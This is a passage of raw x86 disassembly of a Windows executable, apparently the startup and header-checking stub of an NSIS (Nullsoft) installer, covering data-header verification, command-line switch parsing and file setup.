  4032ba:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  4032bf:	75 71                	jne    0x403332
  4032c1:	81 7d e0 ef be ad de 	cmpl   $0xdeadbeef,-0x20(%ebp)
  4032c8:	75 68                	jne    0x403332
  4032ca:	81 7d ec 49 6e 73 74 	cmpl   $0x74736e49,-0x14(%ebp)
  4032d1:	75 5f                	jne    0x403332
  4032d3:	81 7d e8 73 6f 66 74 	cmpl   $0x74666f73,-0x18(%ebp)
  4032da:	75 56                	jne    0x403332
  4032dc:	81 7d e4 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x1c(%ebp)
  4032e3:	75 4d                	jne    0x403332
  4032e5:	09 45 08             	or     %eax,0x8(%ebp)
  4032e8:	8b 45 08             	mov    0x8(%ebp),%eax
  4032eb:	8b 0d 74 e1 41 00    	mov    0x41e174,%ecx
  4032f1:	83 e0 02             	and    $0x2,%eax
  4032f4:	09 05 80 b3 47 00    	or     %eax,0x47b380
  4032fa:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4032fd:	3b c6                	cmp    %esi,%eax
  4032ff:	89 0d 0c b3 47 00    	mov    %ecx,0x47b30c
  403305:	0f 8f 17 01 00 00    	jg     0x403422
  40330b:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  40330f:	75 06                	jne    0x403317
  403311:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  403315:	75 44                	jne    0x40335b
  403317:	ff 45 f8             	incl   -0x8(%ebp)
  40331a:	8d 70 fc             	lea    -0x4(%eax),%esi
  40331d:	3b fe                	cmp    %esi,%edi
  40331f:	76 11                	jbe    0x403332
  403321:	8b fe                	mov    %esi,%edi
  403323:	eb 0d                	jmp    0x403332
  403325:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  403329:	75 07                	jne    0x403332
  40332b:	53                   	push   %ebx
  40332c:	e8 1e fb ff ff       	call   0x402e4f
  403331:	59                   	pop    %ecx
  403332:	3b 35 38 7d 43 00    	cmp    0x437d38,%esi
  403338:	7d 11                	jge    0x40334b
  40333a:	57                   	push   %edi
  40333b:	68 78 e1 41 00       	push   $0x41e178
  403340:	ff 75 fc             	push   -0x4(%ebp)
  403343:	e8 54 35 00 00       	call   0x40689c
  403348:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40334b:	01 3d 74 e1 41 00    	add    %edi,0x41e174
  403351:	2b f7                	sub    %edi,%esi
  403353:	3b f3                	cmp    %ebx,%esi
  403355:	0f 8f 16 ff ff ff    	jg     0x403271
  40335b:	6a 01                	push   $0x1
  40335d:	e8 ed fa ff ff       	call   0x402e4f
  403362:	59                   	pop    %ecx
  403363:	39 1d 0c b3 47 00    	cmp    %ebx,0x47b30c
  403369:	0f 84 b3 00 00 00    	je     0x403422
  40336f:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  403372:	74 2a                	je     0x40339e
  403374:	ff 35 74 e1 41 00    	push   0x41e174
  40337a:	e8 a4 fb ff ff       	call   0x402f23
  40337f:	6a 04                	push   $0x4
  403381:	8d 45 08             	lea    0x8(%ebp),%eax
  403384:	50                   	push   %eax
  403385:	e8 67 fb ff ff       	call   0x402ef1
  40338a:	85 c0                	test   %eax,%eax
  40338c:	0f 84 90 00 00 00    	je     0x403422
  403392:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403395:	3b 45 08             	cmp    0x8(%ebp),%eax
  403398:	0f 85 84 00 00 00    	jne    0x403422
  40339e:	ff 75 f0             	push   -0x10(%ebp)
  4033a1:	6a 40                	push   $0x40
  4033a3:	ff 15 20 81 40 00    	call   *0x408120
  4033a9:	6a 08                	push   $0x8
  4033ab:	8b f0                	mov    %eax,%esi
  4033ad:	5f                   	pop    %edi
  4033ae:	b8 28 7d 42 00       	mov    $0x427d28,%eax
  4033b3:	a3 30 fd 42 00       	mov    %eax,0x42fd30
  4033b8:	a3 2c fd 42 00       	mov    %eax,0x42fd2c
  4033bd:	68 c8 00 4e 00       	push   $0x4e00c8
  4033c2:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4033c8:	50                   	push   %eax
  4033c9:	89 3d 88 61 42 00    	mov    %edi,0x426188
  4033cf:	89 1d a4 66 42 00    	mov    %ebx,0x4266a4
  4033d5:	89 1d a0 66 42 00    	mov    %ebx,0x4266a0
  4033db:	c7 05 28 fd 42 00 28 	movl   $0x42fd28,0x42fd28
  4033e2:	fd 42 00 
  4033e5:	e8 a6 26 00 00       	call   0x405a90
  4033ea:	53                   	push   %ebx
  4033eb:	68 00 01 00 04       	push   $0x4000100
  4033f0:	6a 02                	push   $0x2
  4033f2:	53                   	push   %ebx
  4033f3:	53                   	push   %ebx
  4033f4:	68 00 00 00 c0       	push   $0xc0000000
  4033f9:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4033ff:	50                   	push   %eax
  403400:	ff 15 94 80 40 00    	call   *0x408094
  403406:	a3 14 a0 40 00       	mov    %eax,0x40a014
  40340b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40340e:	75 19                	jne    0x403429
  403410:	b8 d8 84 40 00       	mov    $0x4084d8,%eax
  403415:	e9 8a 00 00 00       	jmp    0x4034a4
  40341a:	6a 01                	push   $0x1
  40341c:	e8 2e fa ff ff       	call   0x402e4f
  403421:	59                   	pop    %ecx
  403422:	b8 40 83 40 00       	mov    $0x408340,%eax
  403427:	eb 7b                	jmp    0x4034a4
  403429:	a1 0c b3 47 00       	mov    0x47b30c,%eax
  40342e:	83 c0 1c             	add    $0x1c,%eax
  403431:	50                   	push   %eax
  403432:	e8 ec fa ff ff       	call   0x402f23
  403437:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40343a:	ff 75 f0             	push   -0x10(%ebp)
  40343d:	f7 d1                	not    %ecx
  40343f:	83 e1 04             	and    $0x4,%ecx
  403442:	a3 44 bd 43 00       	mov    %eax,0x43bd44
  403447:	2b c1                	sub    %ecx,%eax
  403449:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40344c:	56                   	push   %esi
  40344d:	53                   	push   %ebx
  40344e:	8d 44 08 e4          	lea    -0x1c(%eax,%ecx,1),%eax
  403452:	6a ff                	push   $0xffffffff
  403454:	a3 40 bd 43 00       	mov    %eax,0x43bd40
  403459:	e8 5a fc ff ff       	call   0x4030b8
  40345e:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  403461:	75 bf                	jne    0x403422
  403463:	f6 45 dc 01          	testb  $0x1,-0x24(%ebp)
  403467:	89 35 bc b2 47 00    	mov    %esi,0x47b2bc
  40346d:	8b 06                	mov    (%esi),%eax
  40346f:	a3 08 b3 47 00       	mov    %eax,0x47b308
  403474:	74 06                	je     0x40347c
  403476:	ff 05 04 b3 47 00    	incl   0x47b304
  40347c:	8b cf                	mov    %edi,%ecx
  40347e:	8d 46 44             	lea    0x44(%esi),%eax
  403481:	2b c7                	sub    %edi,%eax
  403483:	01 30                	add    %esi,(%eax)
  403485:	49                   	dec    %ecx
  403486:	3b cb                	cmp    %ebx,%ecx
  403488:	75 f7                	jne    0x403481
  40348a:	a1 3c 7d 43 00       	mov    0x437d3c,%eax
  40348f:	89 46 3c             	mov    %eax,0x3c(%esi)
  403492:	6a 40                	push   $0x40
  403494:	83 c6 04             	add    $0x4,%esi
  403497:	56                   	push   %esi
  403498:	68 c0 b2 47 00       	push   $0x47b2c0
  40349d:	e8 7b 25 00 00       	call   0x405a1d
  4034a2:	33 c0                	xor    %eax,%eax
  4034a4:	5f                   	pop    %edi
  4034a5:	5e                   	pop    %esi
  4034a6:	5b                   	pop    %ebx
  4034a7:	c9                   	leave
  4034a8:	c2 04 00             	ret    $0x4
  4034ab:	56                   	push   %esi
  4034ac:	be c8 00 4e 00       	mov    $0x4e00c8,%esi
  4034b1:	56                   	push   %esi
  4034b2:	e8 93 27 00 00       	call   0x405c4a
  4034b7:	56                   	push   %esi
  4034b8:	e8 78 24 00 00       	call   0x405935
  4034bd:	85 c0                	test   %eax,%eax
  4034bf:	75 02                	jne    0x4034c3
  4034c1:	5e                   	pop    %esi
  4034c2:	c3                   	ret
  4034c3:	56                   	push   %esi
  4034c4:	e8 80 2c 00 00       	call   0x406149
  4034c9:	6a 00                	push   $0x0
  4034cb:	56                   	push   %esi
  4034cc:	ff 15 84 80 40 00    	call   *0x408084
  4034d2:	56                   	push   %esi
  4034d3:	68 c0 c0 4d 00       	push   $0x4dc0c0
  4034d8:	e8 b3 25 00 00       	call   0x405a90
  4034dd:	5e                   	pop    %esi
  4034de:	c3                   	ret
  4034df:	55                   	push   %ebp
  4034e0:	8b ec                	mov    %esp,%ebp
  4034e2:	56                   	push   %esi
  4034e3:	8b 75 08             	mov    0x8(%ebp),%esi
  4034e6:	57                   	push   %edi
  4034e7:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4034ea:	33 c0                	xor    %eax,%eax
  4034ec:	0f b7 0e             	movzwl (%esi),%ecx
  4034ef:	0f b7 17             	movzwl (%edi),%edx
  4034f2:	46                   	inc    %esi
  4034f3:	46                   	inc    %esi
  4034f4:	47                   	inc    %edi
  4034f5:	47                   	inc    %edi
  4034f6:	ff 4d 10             	decl   0x10(%ebp)
  4034f9:	66 3b ca             	cmp    %dx,%cx
  4034fc:	77 18                	ja     0x403516
  4034fe:	72 11                	jb     0x403511
  403500:	66 85 c9             	test   %cx,%cx
  403503:	74 14                	je     0x403519
  403505:	66 85 d2             	test   %dx,%dx
  403508:	74 0f                	je     0x403519
  40350a:	39 45 10             	cmp    %eax,0x10(%ebp)
  40350d:	75 dd                	jne    0x4034ec
  40350f:	eb 08                	jmp    0x403519
  403511:	83 c8 ff             	or     $0xffffffff,%eax
  403514:	eb 03                	jmp    0x403519
  403516:	33 c0                	xor    %eax,%eax
  403518:	40                   	inc    %eax
  403519:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40351d:	5f                   	pop    %edi
  40351e:	5e                   	pop    %esi
  40351f:	76 13                	jbe    0x403534
  403521:	85 c0                	test   %eax,%eax
  403523:	75 0f                	jne    0x403534
  403525:	66 3b ca             	cmp    %dx,%cx
  403528:	74 0a                	je     0x403534
  40352a:	66 85 c9             	test   %cx,%cx
  40352d:	0f 95 c0             	setne  %al
  403530:	8d 44 00 ff          	lea    -0x1(%eax,%eax,1),%eax
  403534:	5d                   	pop    %ebp
  403535:	c3                   	ret
  403536:	a1 10 a0 40 00       	mov    0x40a010,%eax
  40353b:	56                   	push   %esi
  40353c:	8b 35 bc 80 40 00    	mov    0x4080bc,%esi
  403542:	83 f8 ff             	cmp    $0xffffffff,%eax
  403545:	74 0a                	je     0x403551
  403547:	50                   	push   %eax
  403548:	ff d6                	call   *%esi
  40354a:	83 0d 10 a0 40 00 ff 	orl    $0xffffffff,0x40a010
  403551:	a1 14 a0 40 00       	mov    0x40a014,%eax
  403556:	83 f8 ff             	cmp    $0xffffffff,%eax
  403559:	74 0a                	je     0x403565
  40355b:	50                   	push   %eax
  40355c:	ff d6                	call   *%esi
  40355e:	83 0d 14 a0 40 00 ff 	orl    $0xffffffff,0x40a014
  403565:	e8 04 04 00 00       	call   0x40396e
  40356a:	6a 07                	push   $0x7
  40356c:	68 d0 40 4e 00       	push   $0x4e40d0
  403571:	e8 46 31 00 00       	call   0x4066bc
  403576:	5e                   	pop    %esi
  403577:	c3                   	ret
  403578:	81 ec d4 02 00 00    	sub    $0x2d4,%esp
  40357e:	53                   	push   %ebx
  40357f:	55                   	push   %ebp
  403580:	56                   	push   %esi
  403581:	57                   	push   %edi
  403582:	6a 20                	push   $0x20
  403584:	33 ed                	xor    %ebp,%ebp
  403586:	5e                   	pop    %esi
  403587:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  40358b:	c7 44 24 10 d8 84 40 	movl   $0x4084d8,0x10(%esp)
  403592:	00 
  403593:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  403597:	ff 15 30 80 40 00    	call   *0x408030
  40359d:	68 01 80 00 00       	push   $0x8001
  4035a2:	ff 15 b8 80 40 00    	call   *0x4080b8
  4035a8:	55                   	push   %ebp
  4035a9:	ff 15 b0 82 40 00    	call   *0x4082b0
  4035af:	6a 08                	push   $0x8
  4035b1:	a3 98 b3 47 00       	mov    %eax,0x47b398
  4035b6:	e8 67 27 00 00       	call   0x405d22
  4035bb:	55                   	push   %ebp
  4035bc:	68 b4 02 00 00       	push   $0x2b4
  4035c1:	a3 b0 b2 47 00       	mov    %eax,0x47b2b0
  4035c6:	8d 44 24 38          	lea    0x38(%esp),%eax
  4035ca:	50                   	push   %eax
  4035cb:	55                   	push   %ebp
  4035cc:	68 1c 86 40 00       	push   $0x40861c
  4035d1:	ff 15 80 81 40 00    	call   *0x408180
  4035d7:	68 04 86 40 00       	push   $0x408604
  4035dc:	68 a0 32 47 00       	push   $0x4732a0
  4035e1:	e8 35 26 00 00       	call   0x405c1b
  4035e6:	ff 15 b4 80 40 00    	call   *0x4080b4
  4035ec:	50                   	push   %eax
  4035ed:	bf a0 c0 4c 00       	mov    $0x4cc0a0,%edi
  4035f2:	57                   	push   %edi
  4035f3:	e8 23 26 00 00       	call   0x405c1b
  4035f8:	55                   	push   %ebp
  4035f9:	ff 15 30 81 40 00    	call   *0x408130
  4035ff:	66 83 3d a0 c0 4c 00 	cmpw   $0x22,0x4cc0a0
  403606:	22 
  403607:	a3 b8 b2 47 00       	mov    %eax,0x47b2b8
  40360c:	8b c7                	mov    %edi,%eax
  40360e:	75 08                	jne    0x403618
  403610:	6a 22                	push   $0x22
  403612:	5e                   	pop    %esi
  403613:	b8 a2 c0 4c 00       	mov    $0x4cc0a2,%eax
  403618:	56                   	push   %esi
  403619:	50                   	push   %eax
  40361a:	e8 f7 22 00 00       	call   0x405916
  40361f:	50                   	push   %eax
  403620:	ff 15 50 82 40 00    	call   *0x408250
  403626:	8b f0                	mov    %eax,%esi
  403628:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  40362c:	e9 8c 00 00 00       	jmp    0x4036bd
  403631:	6a 20                	push   $0x20
  403633:	5b                   	pop    %ebx
  403634:	66 3b c3             	cmp    %bx,%ax
  403637:	75 07                	jne    0x403640
  403639:	46                   	inc    %esi
  40363a:	46                   	inc    %esi
  40363b:	66 39 1e             	cmp    %bx,(%esi)
  40363e:	74 f9                	je     0x403639
  403640:	66 83 3e 22          	cmpw   $0x22,(%esi)
  403644:	75 05                	jne    0x40364b
  403646:	46                   	inc    %esi
  403647:	6a 22                	push   $0x22
  403649:	46                   	inc    %esi
  40364a:	5b                   	pop    %ebx
  40364b:	66 83 3e 2f          	cmpw   $0x2f,(%esi)
  40364f:	75 5b                	jne    0x4036ac
  403651:	46                   	inc    %esi
  403652:	46                   	inc    %esi
  403653:	66 83 3e 53          	cmpw   $0x53,(%esi)
  403657:	75 14                	jne    0x40366d
  403659:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  40365d:	66 83 f8 20          	cmp    $0x20,%ax
  403661:	74 05                	je     0x403668
  403663:	66 3b c5             	cmp    %bp,%ax
  403666:	75 05                	jne    0x40366d
  403668:	83 4c 24 14 02       	orl    $0x2,0x14(%esp)
  40366d:	6a 04                	push   $0x4
  40366f:	68 f8 85 40 00       	push   $0x4085f8
  403674:	56                   	push   %esi
  403675:	e8 65 fe ff ff       	call   0x4034df
  40367a:	83 c4 0c             	add    $0xc,%esp
  40367d:	85 c0                	test   %eax,%eax
  40367f:	75 14                	jne    0x403695
  403681:	0f b7 46 08          	movzwl 0x8(%esi),%eax
  403685:	66 83 f8 20          	cmp    $0x20,%ax
  403689:	74 05                	je     0x403690
  40368b:	66 3b c5             	cmp    %bp,%ax
  40368e:	75 05                	jne    0x403695
  403690:	83 4c 24 14 04       	orl    $0x4,0x14(%esp)
  403695:	6a 04                	push   $0x4
  403697:	8d 46 fc             	lea    -0x4(%esi),%eax
  40369a:	68 ec 85 40 00       	push   $0x4085ec
  40369f:	50                   	push   %eax
  4036a0:	e8 3a fe ff ff       	call   0x4034df
  4036a5:	83 c4 0c             	add    $0xc,%esp
  4036a8:	85 c0                	test   %eax,%eax
  4036aa:	74 1f                	je     0x4036cb
  4036ac:	53                   	push   %ebx
  4036ad:	56                   	push   %esi
  4036ae:	e8 63 22 00 00       	call   0x405916
  4036b3:	8b f0                	mov    %eax,%esi
  4036b5:	66 83 3e 22          	cmpw   $0x22,(%esi)
  4036b9:	75 02                	jne    0x4036bd
  4036bb:	46                   	inc    %esi
  4036bc:	46                   	inc    %esi
  4036bd:	0f b7 06             	movzwl (%esi),%eax
  4036c0:	66 3b c5             	cmp    %bp,%ax
  4036c3:	0f 85 68 ff ff ff    	jne    0x403631
  4036c9:	eb 1d                	jmp    0x4036e8
  4036cb:	6a 08                	push   $0x8
  4036cd:	8d 46 fc             	lea    -0x4(%esi),%eax
  4036d0:	55                   	push   %ebp
  4036d1:	50                   	push   %eax
  4036d2:	e8 66 41 00 00       	call   0x40783d
  4036d7:	83 c4 0c             	add    $0xc,%esp
  4036da:	83 c6 04             	add    $0x4,%esi
  4036dd:	56                   	push   %esi
  4036de:	68 a8 00 4d 00       	push   $0x4d00a8
  4036e3:	e8 33 25 00 00       	call   0x405c1b
  4036e8:	bb c8 00 4e 00       	mov    $0x4e00c8,%ebx
  4036ed:	53                   	push   %ebx
  4036ee:	68 04 20 00 00       	push   $0x2004
  4036f3:	ff 15 b0 80 40 00    	call   *0x4080b0
  4036f9:	e8 ad fd ff ff       	call   0x4034ab
  4036fe:	85 c0                	test   %eax,%eax
  403700:	75 24                	jne    0x403726
  403702:	68 ff 1f 00 00       	push   $0x1fff
  403707:	53                   	push   %ebx
  403708:	ff 15 ac 80 40 00    	call   *0x4080ac
  40370e:	68 e0 85 40 00       	push   $0x4085e0
  403713:	53                   	push   %ebx
  403714:	e8 1e 25 00 00       	call   0x405c37
  403719:	e8 8d fd ff ff       	call   0x4034ab
  40371e:	85 c0                	test   %eax,%eax
  403720:	0f 84 91 00 00 00    	je     0x4037b7
  403726:	68 c0 c0 4d 00       	push   $0x4dc0c0
  40372b:	ff 15 6c 81 40 00    	call   *0x40816c
  403731:	ff 74 24 14          	push   0x14(%esp)
  403735:	e8 a9 fa ff ff       	call   0x4031e3
  40373a:	89 44 24 10          	mov    %eax,0x10(%esp)
  40373e:	3b c5                	cmp    %ebp,%eax
  403740:	75 75                	jne    0x4037b7
  403742:	39 2d 04 b3 47 00    	cmp    %ebp,0x47b304
  403748:	74 5d                	je     0x4037a7
  40374a:	55                   	push   %ebp
  40374b:	57                   	push   %edi
  40374c:	e8 c5 21 00 00       	call   0x405916
  403751:	8b f0                	mov    %eax,%esi
  403753:	eb 16                	jmp    0x40376b
  403755:	6a 04                	push   $0x4
  403757:	68 d4 85 40 00       	push   $0x4085d4
  40375c:	56                   	push   %esi
  40375d:	e8 7d fd ff ff       	call   0x4034df
  403762:	83 c4 0c             	add    $0xc,%esp
  403765:	85 c0                	test   %eax,%eax
  403767:	74 06                	je     0x40376f
  403769:	4e                   	dec    %esi
  40376a:	4e                   	dec    %esi
  40376b:	3b f7                	cmp    %edi,%esi
  40376d:	73 e6                	jae    0x403755
  40376f:	c7 44 24 10 60 85 40 	movl   $0x408560,0x10(%esp)
  403776:	00 
  403777:	3b f7                	cmp    %edi,%esi
  403779:	72 67                	jb     0x4037e2
  40377b:	33 c0                	xor    %eax,%eax
  40377d:	66 89 06             	mov    %ax,(%esi)
  403780:	83 c6 08             	add    $0x8,%esi
  403783:	56                   	push   %esi
  403784:	e8 1c 2a 00 00       	call   0x4061a5
  403789:	85 c0                	test   %eax,%eax
  40378b:	74 2a                	je     0x4037b7
  40378d:	56                   	push   %esi
  40378e:	68 a8 00 4d 00       	push   $0x4d00a8
  403793:	e8 83 24 00 00       	call   0x405c1b
  403798:	56                   	push   %esi
  403799:	68 b0 40 4d 00       	push   $0x4d40b0
  40379e:	e8 78 24 00 00       	call   0x405c1b
  4037a3:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4037a7:	83 0d 8c b3 47 00 ff 	orl    $0xffffffff,0x47b38c
  4037ae:	e8 a8 1d 00 00       	call   0x40555b
  4037b3:	89 44 24 18          	mov    %eax,0x18(%esp)
  4037b7:	e8 7a fd ff ff       	call   0x403536
  4037bc:	ff 15 b4 82 40 00    	call   *0x4082b4
  4037c2:	39 6c 24 10          	cmp    %ebp,0x10(%esp)
  4037c6:	0f 84 ed 00 00 00    	je     0x4038b9
  4037cc:	68 10 00 20 00       	push   $0x200010
  4037d1:	ff 74 24 14          	push   0x14(%esp)
  4037d5:	e8 d6 20 00 00       	call   0x4058b0
  4037da:	6a 02                	push   $0x2
  4037dc:	ff 15 a8 80 40 00    	call   *0x4080a8
  4037e2:	68 c0 85 40 00       	push   $0x4085c0
  4037e7:	53                   	push   %ebx
  4037e8:	e8 4a 24 00 00       	call   0x405c37
  4037ed:	be b8 80 4d 00       	mov    $0x4d80b8,%esi
  4037f2:	56                   	push   %esi
  4037f3:	53                   	push   %ebx
  4037f4:	ff 15 14 81 40 00    	call   *0x408114
  4037fa:	85 c0                	test   %eax,%eax
  4037fc:	74 b9                	je     0x4037b7
  4037fe:	55                   	push   %ebp
  4037ff:	53                   	push   %ebx
  403800:	ff 15 84 80 40 00    	call   *0x408084
  403806:	53                   	push   %ebx
  403807:	ff 15 78 80 40 00    	call   *0x408078
  40380d:	66 39 2d a8 00 4d 00 	cmp    %bp,0x4d00a8
  403814:	75 0b                	jne    0x403821
  403816:	56                   	push   %esi
  403817:	68 a8 00 4d 00       	push   $0x4d00a8
  40381c:	e8 fa 23 00 00       	call   0x405c1b
  403821:	ff 74 24 1c          	push   0x1c(%esp)
  403825:	68 00 c0 47 00       	push   $0x47c000
  40382a:	e8 ec 23 00 00       	call   0x405c1b
  40382f:	68 bc 85 40 00       	push   $0x4085bc
  403834:	68 08 00 48 00       	push   $0x480008
  403839:	e8 dd 23 00 00       	call   0x405c1b
  40383e:	6a 1a                	push   $0x1a
  403840:	5f                   	pop    %edi
  403841:	be 50 bd 43 00       	mov    $0x43bd50,%esi
  403846:	a1 bc b2 47 00       	mov    0x47b2bc,%eax
  40384b:	ff b0 20 01 00 00    	push   0x120(%eax)
  403851:	56                   	push   %esi
  403852:	e8 d6 29 00 00       	call   0x40622d
  403857:	56                   	push   %esi
  403858:	ff 15 6c 81 40 00    	call   *0x40816c
  40385e:	39 6c 24 10          	cmp    %ebp,0x10(%esp)
  403862:	74 3f                	je     0x4038a3
  403864:	6a 01                	push   $0x1
  403866:	56                   	push   %esi
  403867:	68 d8 80 4e 00       	push   $0x4e80d8
  40386c:	ff 15 a4 80 40 00    	call   *0x4080a4
  403872:	85 c0                	test   %eax,%eax
  403874:	74 2d                	je     0x4038a3
  403876:	55                   	push   %ebp
  403877:	56                   	push   %esi
  403878:	e8 0c 2e 00 00       	call   0x406689
  40387d:	a1 bc b2 47 00       	mov    0x47b2bc,%eax
  403882:	ff b0 24 01 00 00    	push   0x124(%eax)
  403888:	56                   	push   %esi
  403889:	e8 9f 29 00 00       	call   0x40622d
  40388e:	56                   	push   %esi
  40388f:	e8 bb 1f 00 00       	call   0x40584f
  403894:	3b c5                	cmp    %ebp,%eax
  403896:	74 0b                	je     0x4038a3
  403898:	50                   	push   %eax
  403899:	ff 15 bc 80 40 00    	call   *0x4080bc
  40389f:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4038a3:	66 ff 05 08 00 48 00 	incw   0x480008
  4038aa:	4f                   	dec    %edi
  4038ab:	75 99                	jne    0x403846
  4038ad:	55                   	push   %ebp
  4038ae:	53                   	push   %ebx
  4038af:	e8 d5 2d 00 00       	call   0x406689
  4038b4:	e9 fe fe ff ff       	jmp    0x4037b7
  4038b9:	39 2d 74 b3 47 00    	cmp    %ebp,0x47b374
  4038bf:	74 7b                	je     0x40393c
  4038c1:	6a 03                	push   $0x3
  4038c3:	e8 5a 24 00 00       	call   0x405d22
  4038c8:	6a 04                	push   $0x4
  4038ca:	8b d8                	mov    %eax,%ebx
  4038cc:	e8 51 24 00 00       	call   0x405d22
  4038d1:	6a 05                	push   $0x5
  4038d3:	8b f0                	mov    %eax,%esi
  4038d5:	e8 48 24 00 00       	call   0x405d22
  4038da:	8b f8                	mov    %eax,%edi
  4038dc:	3b dd                	cmp    %ebp,%ebx
  4038de:	74 48                	je     0x403928
  4038e0:	3b f5                	cmp    %ebp,%esi
  4038e2:	74 44                	je     0x403928
  4038e4:	3b fd                	cmp    %ebp,%edi
  4038e6:	74 40                	je     0x403928
  4038e8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4038ec:	50                   	push   %eax
  4038ed:	6a 28                	push   $0x28
  4038ef:	ff 15 a0 80 40 00    	call   *0x4080a0
  4038f5:	50                   	push   %eax
  4038f6:	ff d3                	call   *%ebx
  4038f8:	85 c0                	test   %eax,%eax
  4038fa:	74 2c                	je     0x403928
  4038fc:	8d 44 24 24          	lea    0x24(%esp),%eax
  403900:	50                   	push   %eax
  403901:	68 94 85 40 00       	push   $0x408594
  403906:	55                   	push   %ebp
  403907:	ff d6                	call   *%esi
  403909:	55                   	push   %ebp
  40390a:	55                   	push   %ebp
  40390b:	55                   	push   %ebp
  40390c:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403910:	50                   	push   %eax
  403911:	55                   	push   %ebp
  403912:	ff 74 24 30          	push   0x30(%esp)
  403916:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  40391d:	00 
  40391e:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%esp)
  403925:	00 
  403926:	ff d7                	call   *%edi
  403928:	55                   	push   %ebp
  403929:	6a 02                	push   $0x2
  40392b:	ff 15 58 82 40 00    	call   *0x408258
  403931:	85 c0                	test   %eax,%eax
  403933:	75 07                	jne    0x40393c
  403935:	6a 09                	push   $0x9
  403937:	e8 e1 da ff ff       	call   0x40141d
  40393c:	a1 8c b3 47 00       	mov    0x47b38c,%eax
  403941:	83 f8 ff             	cmp    $0xffffffff,%eax
  403944:	74 04                	je     0x40394a
  403946:	89 44 24 18          	mov    %eax,0x18(%esp)
  40394a:	ff 74 24 18          	push   0x18(%esp)
  40394e:	e9 89 fe ff ff       	jmp    0x4037dc
  403953:	56                   	push   %esi
  403954:	8b 35 58 fd 43 00    	mov    0x43fd58,%esi
  40395a:	eb 0a                	jmp    0x403966
  40395c:	ff 74 24 08          	push   0x8(%esp)
  403960:	ff 56 04             	call   *0x4(%esi)
  403963:	8b 36                	mov    (%esi),%esi
  403965:	59                   	pop    %ecx
  403966:	85 f6                	test   %esi,%esi
  403968:	75 f2                	jne    0x40395c
  40396a:	5e                   	pop    %esi
  40396b:	c2 04 00             	ret    $0x4
  40396e:	56                   	push   %esi
  40396f:	8b 35 58 fd 43 00    	mov    0x43fd58,%esi
  403975:	6a 00                	push   $0x0
  403977:	e8 d7 ff ff ff       	call   0x403953
  40397c:	85 f6                	test   %esi,%esi
  40397e:	74 1a                	je     0x40399a
  403980:	57                   	push   %edi
  403981:	8b fe                	mov    %esi,%edi
  403983:	ff 77 08             	push   0x8(%edi)
  403986:	8b 36                	mov    (%esi),%esi
  403988:	ff 15 38 81 40 00    	call   *0x408138
  40398e:	57                   	push   %edi
  40398f:	ff 15 2c 81 40 00    	call   *0x40812c
  403995:	85 f6                	test   %esi,%esi
  403997:	75 e8                	jne    0x403981
  403999:	5f                   	pop    %edi
  40399a:	83 25 58 fd 43 00 00 	andl   $0x0,0x43fd58
  4039a1:	5e                   	pop    %esi
  4039a2:	c3                   	ret
  4039a3:	a1 58 fd 43 00       	mov    0x43fd58,%eax
  4039a8:	eb 0b                	jmp    0x4039b5
  4039aa:	8b 48 08             	mov    0x8(%eax),%ecx
  4039ad:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  4039b1:	74 0a                	je     0x4039bd
  4039b3:	8b 00                	mov    (%eax),%eax
  4039b5:	85 c0                	test   %eax,%eax
  4039b7:	75 f1                	jne    0x4039aa
  4039b9:	40                   	inc    %eax
  4039ba:	c2 04 00             	ret    $0x4
  4039bd:	33 c0                	xor    %eax,%eax
  4039bf:	eb f9                	jmp    0x4039ba
  4039c1:	56                   	push   %esi
  4039c2:	8b 74 24 08          	mov    0x8(%esp),%esi
  4039c6:	56                   	push   %esi
  4039c7:	e8 d7 ff ff ff       	call   0x4039a3
  4039cc:	85 c0                	test   %eax,%eax
  4039ce:	75 03                	jne    0x4039d3
  4039d0:	40                   	inc    %eax
  4039d1:	eb 2c                	jmp    0x4039ff
  4039d3:	6a 0c                	push   $0xc
  4039d5:	6a 40                	push   $0x40
  4039d7:	ff 15 20 81 40 00    	call   *0x408120
  4039dd:	85 c0                	test   %eax,%eax
  4039df:	74 1b                	je     0x4039fc
  4039e1:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4039e5:	89 48 04             	mov    %ecx,0x4(%eax)
  4039e8:	8b 0d 58 fd 43 00    	mov    0x43fd58,%ecx
  4039ee:	89 70 08             	mov    %esi,0x8(%eax)
  4039f1:	89 08                	mov    %ecx,(%eax)
  4039f3:	a3 58 fd 43 00       	mov    %eax,0x43fd58
  4039f8:	33 c0                	xor    %eax,%eax
  4039fa:	eb 03                	jmp    0x4039ff
  4039fc:	83 c8 ff             	or     $0xffffffff,%eax
  4039ff:	5e                   	pop    %esi
  403a00:	c2 08 00             	ret    $0x8
  403a03:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  403a08:	75 06                	jne    0x403a10
  403a0a:	ff 05 74 32 47 00    	incl   0x473274
  403a10:	6a 00                	push   $0x0
  403a12:	ff 74 24 08          	push   0x8(%esp)
  403a16:	68 08 04 00 00       	push   $0x408
  403a1b:	ff 35 b4 b2 47 00    	push   0x47b2b4
  403a21:	ff 15 78 82 40 00    	call   *0x408278
